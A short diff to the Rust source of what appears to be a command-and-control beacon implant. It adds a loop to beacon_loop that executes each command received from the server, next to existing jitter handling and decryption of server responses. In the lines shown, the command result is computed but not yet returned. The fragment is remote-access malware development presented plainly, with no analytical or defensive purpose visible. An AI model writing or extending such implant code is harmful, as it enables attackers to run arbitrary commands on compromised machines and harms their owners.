@@ -367,7 +367,12 @@ pub unsafe fn beacon_loop(config: &C2Config) { unsafe {
                             jitter = new_jitter; // because server will send seconds
                             debug!("[BEACON] Jitter update: {}%", jitter);
                         }
-                        // TODO: Execute commands and send result
+                        // Execute commands and send result
+                        for cmd in response.commands.iter() {
+                            debug!("[CMD] Executing: {} (id={})", cmd.command_type, cmd.id);
+
+                            let result = crate::core::commands::execute_command(&cmd.command_type, &cmd.args);
+                        }
                     }
                 } else {
                     debug!("[BEACON] Decryption failed, key mismatch?");
